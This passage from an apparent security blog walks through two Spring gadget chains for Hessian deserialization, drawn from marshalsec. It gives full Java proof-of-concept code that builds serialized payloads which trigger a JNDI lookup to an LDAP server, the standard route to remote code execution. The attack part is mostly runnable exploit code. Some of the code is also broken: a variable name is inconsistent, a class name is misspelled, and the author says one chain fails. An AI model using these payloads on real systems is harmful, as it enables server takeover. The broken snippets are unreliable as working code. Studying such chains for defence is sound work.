, so the output stream is set here so that it can output objects that do not implement the `java.io.Serializable` interface.
```java
package org.h3rmesk1t.Hessian;

import com.caucho.hessian.io.*;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.apache.commons.logging.impl.NoOpLog;
import org.springframework.aop.aspectj.AbstractAspectJAdvice;
import org.springframework.aop.aspectj.AspectInstanceFactory;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJPointcutAdvisor;
import org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory;
import org.springframework.aop.target.HotSwappableTargetSource;
import org.springframework.jndi.support.SimpleJndiBeanFactory;
import sun.reflect.ReflectionFactory;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/11 6:26 pm
 */
public class SpringPartiallyComparableAdvisorHolderGadget {

    public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }

    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static <T> T createWithoutConstructor ( Class<T> classToInstantiate )
            throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }

    @SuppressWarnings ( {
            "unchecked"
    } )
    public static <T> T createWithConstructor ( Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes,
                                                Object[] consArgs ) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }

    public static void main(String[] args) throws Exception {

        String jndiUrl = "ldap://127.0.0.1:1389/fjkrsc";
        SimpleJndiBeanFactory beanFactory = new SimpleJndiBeanFactory();
        beanFactory.addShareableResource(jndiUrl);

        // When deserializing, BeanFactoryAspectInstanceFactory.getOrder will be called, and the call will be triggered. SimpleJndiBeanFactory.getType -> SimpleJndiBeanFactory.doGetType -> SimpleJndiBeanFactory.doGetSingleton -> SimpleJndiBeanFactory.lookup -> JndiTemplate.lookup.
        setFieldValue(beanFactory, "logger", new NoOpLog());
        setFieldValue(beanFactory.getJndiTemplate(), "logger", new NoOpLog());

        // When deserialization, AspectJAroundAdvice.getOrder will be called, and the BeanFactoryAspectInstanceFactory.getOrder will be triggered.
        AspectInstanceFactory aspectInstanceFactory = createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);
        setFieldValue(aspectInstanceFactory, "beanFactory", beanFactory);
        setFieldValue(aspectInstanceFactory, "name", jndiUrl);

        // Deserialization AspectJPointcutA
dvisor.getOrder will be called, and AspectJAroundAdvice.getOrder will be triggered.
        AbstractAspectJAdvice advice = createWithoutConstructor(AspectJAroundAdvice.class);
        setFieldValue(advice, "aspectInstanceFactory", aspectInstanceFactory);

        // PartiallyComparableAdvisorHolder.toString will be called during deserialization, and AspectJPointcutAdvisor.getOrder will be triggered.
        AspectJPointcutAdvisor advisor = createWithoutConstructor(AspectJPointcutAdvisor.class);
        setFieldValue(advisor, "advice", advice);

        // Xstring.equals will be called during deserialization, triggering PartiallyComparableAdvisorHolder.toString.
        Class<?> pcahCl = Class.forName("org.springframework.aop.aspectj.autopproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder");
        Object pcah = createWithoutConstructor(pcahCl);
        setFieldValue(pcah, "advisor", advisor);

        // HotSwappableTargetSource.equals will be called during deserialization, triggering Xstring.equals.
        HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(pcah);
        HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(new XString("h3rmesk1t"));

        HashMap<Object, Object> hashMap = new HashMap<>();
        setFieldValue(hashMap, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, hotSwappableTargetSource1, hotSwappableTargetSource1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, hotSwappableTargetSource2, hotSwappableTargetSource2, null));
        setFieldValue(hashMap, "table", tbl);

        // Hessian serializes data
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);
        AllowNonSerializableFactory serializableFactory = new AllowNonSerializableFactory();
        serializableFactory.setAllowNonSerializable(true);
        hessianOutput.setSerializerFactory(serializableFactory);
        hessianOutput.writeObject(hashMap);
        byte[] serializedData = byteArrayOutputStream.toByteArray();
        System.out.println("Hessian serialized data is: " + new String(serializedData, 0, serializedData.length));

        // Hessian deserializes data
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serializedData);
        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
        hessianInput.readObject();
    }
}
```

<div align=center><img src="./images/6.png"></div>

## SpringAbstractBeanFactoryPointcutAdvisor
### Construct Analysis
 - Let's first look at the SpringAbstractBeanFactoryPointcutAdvisor.java` given in marshalsec. Here, like `SpringPartiallyComparableAdvisorHolderGadget`, or pass the incoming `jndiUrl` into the SpringUtil#makeJNDITrigger` method, and then call the `SpringUtil#makeBeanFactoryTriggerBFPA` method.

```java
public interface SpringAbstractBeanFactoryPointcutAdvisor extends Gadget {

    @Primary
    @Args ( minArgs = 1, args = {
        "jndiUrl"
    }, defaultArgs = {
        MarshallerBase.defaultJNDIUrl
    } )
    default Object makeBeanFactoryPointcutAdvisor ( UtilFactory uf, String[] args ) throws Exception {
        String jndiUrl = args[ 0 ];
        return SpringUtil.makeBeanFactoryTriggerBFPA(uf, jndiUrl, SpringUtil.makeJNDITrigger(jndiUrl));
    }
}
```

 - Follow up on the `SpringUtil#makeBeanFactoryTriggerBFPA` method, first create a `DefaultBeanFactoryPointcutAdvisor` instance, then call the `setBeanFactory` and `setAdviceBeanName` methods of the instance, and finally call the `UtilFactory#makeEqualsTrigger` method.

```java
public static Object makeBeanFactoryTriggerBFPA ( UtilFactory uf, String name, BeanFactory bf ) throws Exception {
    DefaultBeanFactoryPointcutAdvisor pcdv = new DefaultBeanFactoryPointcutAdvisor();
    pcadv.setBeanFactory(bf);
pcdv.setAdviceBeanName(name);
    return uf.makeEqualsTrigger(pcadv, new DefaultBeanFactoryPointcutAdvisor());
}
```

 - Follow up on the `UtilFactory#makeEqualsTrigger` method, then call `JDKUtil#makeMap`, and then the same processing process as `RomeGadget`.

```java
default Object makeEqualsTrigger (Object tgt, Object sameHash ) throws Exception {
    return JDKUtil.makeMap(tgt, sameHash);
}
```

### POC
```java
package org.h3rmesk1t.Hessian;

import com.caucho.hessian.io.*;
import org.apache.commons.logging.impl.NoOpLog;
import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.jndi.support.SimpleJndiBeanFactory;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/11 11:34 pm
 */
public class SpringAbstractBeanFactoryPointcutAdvisorGadget {

    public static Field getField (final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }

    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {

        String jndiUrl = "ldap://127.0.0.1:1389/fjkrsc";
        SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
        bf.setShareableResources(jndiUrl);
        setFieldValue(bf, "logger", new NoOpLog());
        setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());

        DefaultBeanFactoryPointcutAdvisor pcdv = new DefaultBeanFactoryPointcutAdvisor();
        pcadv.setBeanFactory(bf);
        pcdv.setAdviceBeanName(jndiUrl);

        HashMap<Object, Object> hashMap = new HashMap<>();
        setFieldValue(hashMap, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, pcadv, pcadv, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, new DefaultBeanFactoryPointcutAdvisor(), new DefaultBeanFactoryPointcutAdvisor(), null));
        setFieldValue(hashMap, "table", tbl);

        // Hessian serializes data
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);
        AllowNonSerializableFactory serializableFactory = new AllowNonSerializableFactory();
        serializableFactory.setAllowNonSerializable(true);
        hessianOutput.setSerializerFactory(serializableFactory);
        hessianOutput.writeObject(hashMap);
        byte[] serializedData = byteArrayOutputStream.toByteArray();
        System.out.println("Hessian serialized data is: " + new String(serializedData, 0, serializedData.length));

        // Hessian deserializes data
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serializedData);
        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
        hessianInput.readObject();
    }
}
```

I don't know why I can't get through, but after a long time of investigation, I'm still stupid
Error `Exception in thread "main" java.lang.IllegalStateException: 'adviceBeanName' must be specified`, take a pit first...∂

# refer to
 - [Hessian deserialization and related utilization chain](https://paper.seebug.org/1131/)
 - [Java Security Dubbo Deserialization Vulnerability Analysis](https://www.anquanke.com/post/id/263274)